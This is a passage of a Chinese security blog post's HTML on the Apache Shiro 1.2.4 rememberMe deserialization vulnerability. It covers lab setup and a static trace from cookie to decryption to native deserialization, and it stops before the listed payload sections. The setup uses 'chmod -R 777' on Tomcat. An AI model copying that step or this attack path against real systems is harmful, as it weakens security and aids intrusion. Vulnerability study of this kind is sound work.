@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境搭建下载源码123git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;shiro.gitcd shirogit checkout shiro-root-1.2.4  修改shiro&#x2F;samples&#x2F;web目录下的pom.xml 中jstl版本为1.2后更新maven  部署tomcat（这里我权限不足 给上级目录更改了下权限） 1sudo chmod -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro反序列化漏洞">
+<meta property="og:url" content="http://byesec.com/posts/950ba293.html">
+<meta property="og:site_name" content="patrik&#39;s blog">
+<meta property="og:description" content="环境搭建下载源码123git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;shiro.gitcd shirogit checkout shiro-root-1.2.4  修改shiro&#x2F;samples&#x2F;web目录下的pom.xml 中jstl版本为1.2后更新maven  部署tomcat（这里我权限不足 给上级目录更改了下权限） 1sudo chmod -">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at14.55.32@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at15.22.15@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.10.42@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.12.05@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.18.48@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.19.44@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231116163211884.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.33.22@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.35.13@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.35.47@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231116163712527.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.37.40@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.40.36@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.41.11@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.42.53@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.46.41@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.47.55@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.50.11@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.52.27@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.53.38@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.56.04@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.16.30@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.19.49@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.22.45@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.58.14@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.21.57@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.32.11@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.35.01@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.41.07@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.49.07@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.50.16@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.51.03@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.51.42@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117125300358.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117125403766.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.00.49@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.02.16@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117130548805.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.08.55@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.10.15@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.06.51@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.18.11@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.27.14@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.40.13@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.14.20@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.15.00@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.18.44@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.21.10@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.26.35@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.29.59@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.48.12@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.51.10@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.50.23@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-20at09.59.11@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240104112020212.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115101937341.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102026802.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102136143.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102323885.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102624084.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103019443.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103051026.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103129700.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103255828.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103339819.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115104045878.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115104158415.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115105558675.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115105943229.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125323686.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115124713204.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125654628.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125934644.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130145666.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130232812.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130334270.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130402005.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130523583.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130651736.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130848555.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115142654347.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143039757.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143159203.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144508222.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144719277.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144850501.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115145000272.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115150009491.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115150045066.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143859811.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144005508.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144128303.png">
+<meta property="article:published_time" content="2024-01-15T09:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-06T08:04:06.452Z">
+<meta property="article:author" content="patrik">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at14.55.32@2x.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=48">
+          
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>Shiro反序列化漏洞</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="patrik&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/6645322e.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/5aa3009d.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/950ba293.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/950ba293.html&text=Shiro反序列化漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/950ba293.html&is_video=false&description=Shiro反序列化漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro反序列化漏洞&body=Check out this article: http://byesec.com/posts/950ba293.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/950ba293.html&name=Shiro反序列化漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/950ba293.html&t=Shiro反序列化漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">下载源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2tomcat"><span class="toc-number">1.2.</span> <span class="toc-text">部署tomcat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie"><span class="toc-number">2.1.</span> <span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">静态分析源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDK%E5%86%85%E7%BD%AE%E9%93%BE%E6%89%93%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">JDK内置链打法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8CC%E9%93%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text">为什么不用CC链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">3.1.2.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9B%BF%E6%8D%A2%E5%AF%86%E9%92%A5"><span class="toc-number">3.1.3.</span> <span class="toc-text">生成替换密钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.4.</span> <span class="toc-text">动态分析源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E9%93%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">CC链的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CB%E9%93%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">CB链的利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">4.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%851-CB%E9%BB%98%E8%AE%A4%E4%BE%9D%E8%B5%96CC%E4%BE%9D%E8%B5%96%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">补充1:CB默认依赖CC依赖的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%852-%E7%94%A8ysoserial%E6%89%93-%E4%BE%9D%E8%B5%96%E5%BA%93%E7%89%88%E6%9C%AC%E4%B8%8D%E5%90%8C%E6%8A%A5%E9%94%99"><span class="toc-number">4.2.</span> <span class="toc-text">补充2:用ysoserial打 依赖库版本不同报错</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Shiro反序列化漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">patrik</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-15T09:00:00.000Z" class="dt-published" itemprop="datePublished">2024-01-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%F0%9F%94%90/">安全🔐</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
+
+<p>修改shiro&#x2F;samples&#x2F;web目录下的<code>pom.xml</code> 中<code>jstl版本为1.2</code>后更新maven</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at14.55.32@2x.png" alt="CleanShot2023-11-16at14.55.32@2x"></p>
+<h3 id="部署tomcat"><a href="#部署tomcat" class="headerlink" title="部署tomcat"></a>部署tomcat</h3><p>（这里我权限不足 给上级目录更改了下权限）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R 777 tomcat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at15.22.15@2x.png" alt="CleanShot2023-11-16at15.22.15@2x"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>到登录页面登录并勾选<code>Remember Me</code>burp抓个包看看</p>
+<p>![CleanShot2023-11-16at15.27.41@2x](<a target="_blank" rel="noopener" href="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot">https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot</a> 2023-11-16 at <a href="mailto:&#49;&#53;&#x2e;&#x32;&#x37;&#x2e;&#52;&#49;&#64;&#x32;&#x78;&#46;&#x70;&#x6e;&#x67;">&#49;&#53;&#x2e;&#x32;&#x37;&#x2e;&#52;&#49;&#64;&#x32;&#x78;&#46;&#x70;&#x6e;&#x67;</a>)</p>
+<p>请求后会返回Cookie</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.10.42@2x.png" alt="CleanShot2023-11-16at16.10.42@2x"></p>
+<p>并在后续请求中也会带上这个Cookie</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.12.05@2x.png" alt="CleanShot2023-11-16at16.12.05@2x"></p>
+<h3 id="静态分析源码"><a href="#静态分析源码" class="headerlink" title="静态分析源码"></a>静态分析源码</h3><p>IDEA中<code>Shift+Shift</code>搜索Shiro包中的和cookie相关的类<code>CookieRememberMeManager.java</code></p>
+<p>发现两个函数</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.18.48@2x.png" alt="CleanShot2023-11-16at16.18.48@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.19.44@2x.png" alt="CleanShot2023-11-16at16.19.44@2x"></p>
+<p>找一下哪里调用了<code>getRememberedSerializedIdentity</code></p>
+<p>将字节转化为认证信息</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231116163211884.png" alt="image-20231116163211884"></p>
+<p>解密+反序列化</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.33.22@2x.png" alt="CleanShot2023-11-16at16.33.22@2x"></p>
+<p>跟一下反序列化函数<code>deserialize</code></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.35.13@2x.png" alt="CleanShot2023-11-16at16.35.13@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.35.47@2x.png" alt="CleanShot2023-11-16at16.35.47@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231116163712527.png" alt="image-20231116163712527"></p>
+<p>发现调取了原生的反序列化</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.37.40@2x.png" alt="CleanShot2023-11-16at16.37.40@2x"></p>
+<p>再回到<code>AbstractRememberMeManager.java</code>跟进一下解密函数<code>decrypt</code></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.40.36@2x.png" alt="CleanShot2023-11-16at16.40.36@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.41.11@2x.png" alt="CleanShot2023-11-16at16.41.11@2x"></p>
+<p>用Key解密的 应该为对称加密</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.42.53@2x.png" alt="CleanShot2023-11-16at16.42.53@2x"></p>
+<p>回到解密函数</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.46.41@2x.png" alt="CleanShot2023-11-16at16.46.41@2x"></p>
